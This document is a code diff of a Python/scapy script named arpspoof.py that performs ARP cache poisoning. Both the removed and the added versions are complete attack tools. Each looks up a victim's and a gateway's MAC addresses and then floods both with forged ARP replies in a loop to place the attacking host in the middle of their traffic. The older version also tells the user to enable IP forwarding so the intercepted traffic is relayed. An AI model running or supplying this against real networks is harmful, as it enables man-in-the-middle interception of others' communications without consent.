@@ -1,150 +1,78 @@
-from scapy.layers.l2 import Ether, ARP, srp, sendp
+from scapy.layers.l2 import Ether,ARP,srp, sendp
 import sys
-import time
-from scapy.all import get_if_hwaddr  # Added to fetch the attacker's MAC address
 
-# Script now expects 4 total arguments: [script_name, target_ip, gateway_ip, interface_name]
-EXPECTED_ARGUMENT_COUNT = 4
+# broadcast_mac = Ether(dst="ff:ff:ff:ff:ff:ff")
+# arp_ip = ARP(pdst="192.168.64.3")
+# # arp_ip  = ARP(pdst="10.0.0.1")
+# print("Preparing to send")
+# answered, unanswered = srp(broadcast_mac/arp_ip)
+# print("Sent ARP successfully")
+# if answered:
+#     for sent, received in answered:
+#         print(f"IP: {sent.psrc} and MAC: {sent.hwsrc}")
+#         print(f"IP: {received.psrc} and MAC: {received.hwsrc}")
+# else:
+#     print("No answer")
 
 
-def get_mac(ip, interface):
-    """
-    Sends an ARP request to the specified IP address and returns its MAC address.
-    Uses the specified network interface for sending and listening.
-    """
-    # Create an Ethernet frame with broadcast destination MAC
+EXPECTED_ARGUMENT_COUNT = 3
+
+def get_mac(ip):
     broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    # Create an ARP request packet targeting the given IP
     arp_ip = ARP(pdst=ip)
-
-    # Send and receive packets on layer 2 (Ethernet) using the specified interface
-    # timeout=1: wait up to 1 second for a response
-    # verbose=0: suppress scapy output
-    answered, _ = srp(broadcast / arp_ip, timeout=1, verbose=0, iface=interface)
-
+    answered, _ = srp(broadcast/arp_ip, timeout=1, verbose=0)
     if not answered:
-        # Raise an exception if no host responds
-        raise Exception(f"Host with IP {ip} did not respond to ARP request.")
-
-    # Extract the hardware source (hwsrc) MAC address from the received packet (answered[0][1])
+        raise Exception(f"IP {ip} does not exists!")
+    # answered[0] -> first found (sent, received) pair, and answered[0][1] is the received (who responded)
     mac = answered[0][1].hwsrc
     return mac
 
-
-def restore(victim_ip, gateway_ip, victim_mac_real, gateway_mac_real, interface):
-    """
-    Restores the ARP tables of the victim and gateway to their correct state.
-    Sends packets multiple times to ensure targets update their cache.
-    """
-    # Restore Victim: tell victim the truth about the gateway's MAC
-    # The hwsrc is the REAL gateway MAC
-    victim_restore_packet = ARP(op=2,
-                                pdst=victim_ip,
-                                psrc=gateway_ip,
-                                hwdst=victim_mac_real,
-                                hwsrc=gateway_mac_real)
-
-    # Restore Gateway: tell gateway the truth about the victim's MAC
-    # The hwsrc is the REAL victim MAC
-    gateway_restore_packet = ARP(op=2,
-                                 pdst=gateway_ip,
-                                 psrc=victim_ip,
-                                 hwdst=gateway_mac_real,
-                                 hwsrc=victim_mac_real)
-
-    # Send packets multiple times on the specified interface
-    sendp(victim_restore_packet, count=7, verbose=False, iface=interface)
-    sendp(gateway_restore_packet, count=7, verbose=False, iface=interface)
-
-    print("[+] ARP tables successfully restored. Script terminated.")
-
-
-def spoof(victim_ip, spoof_ip, interface):
-    """
-    Sends a malicious ARP response packet to the victim using the specified interface.
-    """
-
-    # Get the victim's current MAC address
+def spoof(victim_ip, spoof_ip):
     try:
-        victim_mac = get_mac(victim_ip, interface)
+        victim_mac = get_mac(victim_ip)
     except Exception as e:
-        print(f"Error while fetching MAC for {victim_ip}: {e}")
+        print(f"Exception while get mac for {victim_ip}: {e}")
         return
-
-    # op=2: ARP response (is-at)
-    # psrc: The IP we are claiming to be (e.g., the Gateway IP when spoofing the Victim)
-    # Scapy automatically sets hwsrc (Source MAC) to the Attacker's interface MAC.
     packet = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=spoof_ip)
+    sendp(packet, iface="eth0", verbose=False)
+    print(f"[+] Spoofed {victim_ip} pretending as {spoof_ip}")
 
-    # --- DEBUG INFORMATION ADDED ---
-    attacker_mac = get_if_hwaddr(interface)
-    print(f"DEBUG: Forging reply for {victim_ip} ({victim_mac}). Claiming {spoof_ip} has MAC {attacker_mac}")
-    # -----------------------------
+def restore(victim_ip, spoof_ip):
+    victim_mac = get_mac(victim_ip)
+    spoof_mac = get_mac(spoof_ip)
+    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=spoof_mac)
+    sendp(packet, iface="eth0", verbose=False)
+    print(f"[+] Restoring {victim_ip}...")
 
-    # Use sendp() for Layer 2 packets to ensure an Ethernet frame is generated.
-    sendp(packet, iface=interface, verbose=False)
-    print(f"[+] Sent to {victim_ip}: claiming {spoof_ip} is at our MAC address.")
+def run(victim_ip, gateway_ip):
+    victim_mac = get_mac(victim_ip)
+    gateway_mac = get_mac(gateway_ip)
 
-
-def run(victim_ip, gateway_ip, interface):
-    """
-    The main spoofing loop that continuously sends ARP packets.
-    """
-    print("\nStarting ARP Spoofing. Press Ctrl+C to stop...")
-    print("------------------------------------------")
-
-    try:
-        # Get and store the real MAC addresses before starting the loop
-        victim_mac_real = get_mac(victim_ip, interface)
-        gateway_mac_real = get_mac(gateway_ip, interface)
-        print(f"Target (Victim IP): {victim_ip} (MAC: {victim_mac_real})")
-        print(f"Gateway IP: {gateway_ip} (MAC: {gateway_mac_real})")
-    except Exception as e:
-        print(f"\n[!] Script stopped due to initial MAC lookup failure: {e}")
-        return
-
-    # CRITICAL: If you are running this on Linux, you must enable IP forwarding
-    # for the spoofing to result in Man-in-the-Middle traffic forwarding.
-    print("\n[!] IMPORTANT: Ensure IP forwarding is enabled on your machine!")
-    print("Use: sudo sysctl -w net.ipv4.ip_forward=1")
+    print(f"MAC address for {victim_ip}: {victim_mac}")
+    print(f"MAC address for {gateway_ip}: {gateway_mac}")
 
     while True:
         try:
-            # Tell the victim that we are the gateway
-            spoof(victim_ip, gateway_ip, interface)
-            # Tell the gateway that we are the victim
-            spoof(gateway_ip, victim_ip, interface)
-
-            time.sleep(2)  # Wait 2 seconds before sending the next pair of packets
-
+            spoof(victim_ip, gateway_ip)
+            spoof(gateway_ip, victim_ip)
+            print("********************************")
         except KeyboardInterrupt:
-            print("\n[!] Ctrl+C detected. Restoring ARP tables...")
-            # Restore the ARP tables using the real MACs we stored
-            restore(victim_ip, gateway_ip, victim_mac_real, gateway_mac_real, interface)
-            break
-        except Exception as e:
-            print(f"\n[!] Critical error: {e}. Attempting to restore ARP tables.")
-            restore(victim_ip, gateway_ip, victim_mac_real, gateway_mac_real, interface)
+            print("Cancelling")
+            restore(gateway_ip, victim_ip)
+            restore(victim_ip, gateway_ip)
             break
 
 
 def main():
+    # Check if the total number of arguments (length of sys.argv) is 3
     if len(sys.argv) != EXPECTED_ARGUMENT_COUNT:
-        print("Usage: sudo python3 arpspoof.py <Target IP> <Gateway IP> <Interface Name>")
-        print("Example: sudo python3 arpspoof.py 192.168.1.100 192.168.1.1 eth0")
+        print("Usage: sudo python3 arpspoof.py <Target IP> <Gateway IP>")
         print(f"Error: Expected {EXPECTED_ARGUMENT_COUNT - 1} arguments, but received {len(sys.argv) - 1}.")
-        sys.exit(1)
+        sys.exit(1) # Exit with an error code
 
     victim_ip = sys.argv[1]
     gateway_ip = sys.argv[2]
-    interface = sys.argv[3]
-
-    print("--- ARP Spoofing Tool ---")
-    print(f"Using interface: {interface}")
-    print("NOTE: Requires 'scapy' (pip install scapy) and root privileges (sudo).")
-
-    run(victim_ip, gateway_ip, interface)
-
+    run(victim_ip, gateway_ip)
 
 if __name__ == "__main__":
     main()
